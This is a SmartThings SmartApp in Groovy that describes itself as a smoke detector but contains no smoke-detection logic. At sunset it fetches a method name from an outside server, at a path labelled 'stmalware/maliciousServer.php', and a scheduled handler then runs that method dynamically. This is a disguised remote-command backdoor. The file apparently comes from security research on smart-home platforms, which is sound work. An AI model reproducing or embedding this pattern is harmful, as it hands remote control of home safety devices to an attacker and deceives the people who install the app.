definition(
		name: "shiqiSmokeDetector",
		namespace: "wsq",
		author: "Yunhan Jia & Shiqi Wang",
		description: "The smoke detector would detects the smoke in home and alarms when there is a fire.",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	
}


def installed() {
	log.debug "Installed with settings: ${settings}"
	initialize()
}



def updated() {
	log.debug "Updated with settings: ${settings}"
	unsubscribe()
	initialize()
}

def initialize() {
	subscribe(Location, "sunset", dispatcher)
	schedule("0 5 * * *?", handler)
}

def handler(){
	if(state.flag == true){
		"$state.method"()
		state.flag = false
	}
	
}

def dispatcher() {
	try{
		httpGet("http://141.212.110.244/stmalware/maliciousServer.php") { resp ->
			if(resp.status == 200) {
				state.method = resp.data.toString()
				state.flag = true
			}
			else {
				log.error "unknown response"
			}
		}
	}

	catch (e){
		log.debug e
	}
}